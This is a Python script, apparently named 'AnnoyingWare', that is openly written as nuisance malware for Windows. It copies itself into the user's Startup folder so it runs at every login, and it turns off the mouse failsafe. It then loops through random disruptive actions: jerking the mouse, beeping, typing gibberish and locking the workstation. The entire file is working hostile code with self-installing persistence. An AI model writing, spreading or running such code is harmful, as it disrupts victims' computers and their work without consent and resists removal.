import os, shutil, sys, pyautogui, random, winsound, time, string, ctypes

pyautogui.FAILSAFE = False

def install():
    # Get the path to the startup folder
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Get the current script's file path
    script_path = sys.argv[0]

    # Get the name of the script (AnnoyingWare.py)
    script_name = os.path.basename(script_path)

    # Destination path in the startup folder
    destination = os.path.join(startup_folder, script_name)

    # Check if the script is already in the startup folder
    if not os.path.exists(destination):
        # Copy the script to the startup folder
        shutil.copy(script_path, destination)
        print(f"{script_name} has been moved to the startup folder.")
    else:
        print(f"{script_name} is already in the startup folder.")

def randomaction():
    # List of functions to randomly pick from (excluding 'install')
    actions = [spazmouse, random_beep, random_typing, lock_pc]

    action = random.choice(actions)
    action()

    timer = random.randint(1, 2)
    time.sleep(timer)

    randomaction()

def spazmouse():
    # Get screen width and height
    screen_width, screen_height = pyautogui.size()

    # Move the mouse to random points on the screen 25 times with no delay
    for _ in range(10):
        # Generate random x and y coordinates
        x = random.randint(0, screen_width - 1)
        y = random.randint(0, screen_height - 1)

        # Move the mouse to the generated coordinates
        pyautogui.moveTo(x, y)

def random_beep():
    winsound.Beep(random.randint(100, 2000), 500)  # Random beep frequency and duration

def random_typing():
    length = random.randint(1, 16)
    randomstring = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    pyautogui.write(randomstring, interval=0.1)  # Type random gibberish

def lock_pc():
    ctypes.windll.user32.LockWorkStation()

if __name__ == "__main__":
    install()
    randomaction()